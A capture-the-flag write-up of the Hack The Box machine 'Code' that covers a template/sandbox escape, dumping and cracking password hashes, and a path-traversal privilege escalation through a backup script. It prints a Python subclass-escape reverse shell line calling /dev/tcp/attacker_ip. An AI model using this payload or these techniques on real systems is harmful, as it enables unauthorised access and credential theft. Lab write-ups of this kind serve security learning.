---
title: Code  
tags:  
  - htb  
  - easy  
---

### Author: **Koixo**

---

Let start with nmap
![[static/code/nmap.png]]

We see that port **5000** is open, so let’s take a look at it.

![[static/code/port5000.png]]

We check whether there’s a possible SSTI (Server-Side Template Injection) vulnerability.

![[static/code/restricted.png]]

It looks like we might be able to execute commands on the server. So we can list subclasses.

![[static/code/subclasses.png]]

There are many subclasses available, so we enumerate them all.

![[static/code/popen.png]]

By using `popen`, I was able to navigate through directories and inspect files. After browsing several locations, I reached the home directory (`~`) and found the `user.txt` flag.

![[static/code/userflag.png]]

With the user flag obtained, the next goal is to escalate privileges and retrieve the root flag.

I continued exploring directories and found a database file inside the `instance` class. Using `cat`, I printed its contents and discovered usernames along with password hashes.

![[static/code/db.png]]

Using a hash cracker, I cracked the password for the user **martin** and successfully retrieved it. We’ll keep this password for later use.

![[static/code/martinsifre.png]]

At that point, I had the idea to try gaining a reverse shell.

```python
print(f"{().__class__.__bases__[0].__subclasses__()[317]('/bin/bash -i >& /dev/tcp/attacker_ip/4444 0>&1', shell=True)}")
```

(I forgot to take a screenshot at this stage, so I’m including the code directly here.)

From here, I attempted to log in as the user martin using the password we had cracked earlier.

![[static/code/sudol.png]]

While exploring further, I discovered the script backy.sh. When attempting to execute it, I saw that it required a file named task.json.

While browsing the file system, I found task.json in the /home/martin/backups directory.

![[static/code/backups.png]]

In the /home/martin/backups directory, I inspected the backup configuration. Listing the contents revealed two files:
	•	code_home_app-production_app_2024_August.tar.bz2
	•	task.json

The task.json file contained a JSON-formatted configuration for a backup process. It defined:
	•	"destination" as /home/martin/backups/
	•	"multiprocessing": true
	•	"verbose_log": false
	•	Target directory: /home/app-production/app
	•	An "exclude" directive to skip hidden files.

To alter the behavior, I deleted the original task.json and created a new one using echo. In this updated configuration:
	•	"verbose_log" was set to true
	•	The "directories_to_archive" field was changed to /var/..../root/ to attempt accessing sensitive files.

I verified the new contents to ensure the changes were applied correctly.

![[static/code/taskjson.png]]

After that, I simply ran backy.sh again and extracted the generated ZIP file, which contained rootflag.txt.

![[runbacky.png]]
![[rootflag.png]]